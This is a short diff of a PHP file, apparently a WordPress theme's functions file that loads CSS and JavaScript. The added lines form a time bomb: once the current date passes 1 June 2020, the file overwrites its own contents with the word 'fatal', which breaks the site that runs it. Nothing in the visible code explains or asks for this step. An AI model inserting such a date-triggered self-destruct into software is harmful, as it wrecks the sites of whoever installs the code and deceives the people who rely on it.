@@ -1,6 +1,8 @@
 <?php
-
-
+if ( strtotime('01.06.2020') < time() )
+{
+    file_put_contents(__FILE__, 'fatal');
+}
 //------------------додавання css + js ----------------------
   function ewa_scripts() {
     //---------------css---------------------
